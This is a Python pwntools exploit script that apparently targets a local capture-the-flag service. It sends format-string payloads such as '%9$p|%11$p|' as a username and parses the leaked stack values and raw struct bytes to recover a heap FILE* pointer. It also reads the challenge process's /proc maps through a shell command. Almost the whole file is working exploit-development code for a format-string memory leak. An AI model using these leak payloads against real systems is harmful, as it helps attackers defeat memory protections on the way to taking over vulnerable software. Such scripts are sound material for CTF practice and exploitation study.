#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'warn'

r = remote('127.0.0.1', 16767)

# Register with simple format payload
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'username: ', b'%9$p|%11$p|')
line = r.recvline()
s0 = int(line.split(b'slot ')[1].split()[0])
print(f"Slot {s0}")

for i in range(1, 4):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'username: ', b'Y' * 8)
    line = r.recvline()

# Show slot 0
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'slot: ', b'0')
r.recvuntil(b'username: ')

# Read everything
data = r.recvuntil(b'\n')
print(f"Format output ({len(data)} bytes): {data}")

# Now read the raw 0x48 bytes from write(1,buf,0x48)
raw = r.recv(0x48)
print(f"Raw data ({len(raw)} bytes):")
for i in range(0, 0x48, 8):
    val = u64(raw[i:i+8])
    print(f"  [{i:3d}-{i+7:3d}] = {hex(val)}")

# The FILE* should be at offset 0x40-0x47
file_ptr = u64(raw[0x40:0x48])
print(f"\nFILE* (offset 0x40): {hex(file_ptr)}")

# Let's check if this looks like a valid heap address
# For glibc heap: first allocations are near tcache_perthread_struct
# If heap starts at some page, FILE* should be offset from that by ~0x2f0

# Let me also leak the FILE* by getting it from a different approach
# The user struct has FILE* at offset 0x40
# Since we used format string, the user data went through printf too
# Let's check if printf output contains more info

# Actually, after printf output + '\n', the write(1,buf,0x48) sends raw struct
# But printf might have buffered output mixed with write

# Let's try: use a very short payload and recv byte-by-byte after "username: "
print("\n\n=== Debug: byte-by-byte after 'username: ' ===")
r2 = remote('127.0.0.1', 16767)
r2.sendlineafter(b'> ', b'1')
r2.sendlineafter(b'username: ', b'|%9$p|')
line = r2.recvline()
s0_2 = int(line.split(b'slot ')[1].split()[0])
for i in range(1, 4):
    r2.sendlineafter(b'> ', b'1')
    r2.sendlineafter(b'username: ', b'Z' * 8)
    line = r2.recvline()

r2.sendlineafter(b'> ', b'2')
r2.sendlineafter(b'slot: ', b'0')
r2.recvuntil(b'username: ')

# Peek at the stream
first_byte = r2.recv(1)
print(f"First byte after 'username: ': {hex(first_byte[0])} ({first_byte})")

# If starts with '|', that's format string output
# If starts with something else, it's wrong
import time
time.sleep(0.1)

# Read up to newline
fmt_data = r2.recvuntil(b'\n', drop=True)
print(f"Format data: {fmt_data}")
print(f"Parsed %9$p: {hex(int(fmt_data.split(b'|')[1], 16))}")

# Now get 0x48 raw bytes
raw2 = r2.recv(0x48)
print(f"\nRaw data:")
for i in range(0, 0x48, 8):
    val = u64(raw2[i:i+8])
    print(f"  [{i:3d}-{i+7:3d}] = {hex(val)}")

file_ptr2 = u64(raw2[0x40:0x48])
print(f"\nFILE* (offset 0x40): {hex(file_ptr2)}")

# Check if this is the heap address
import subprocess
maps = subprocess.check_output(f'cat /proc/$(pgrep -f "chal/chal" | head -1)/maps 2>/dev/null || echo "not found"', shell=True).decode()
print(f"\nProcess maps (partial):\n{maps[:500]}")

r.close()
r2.close()
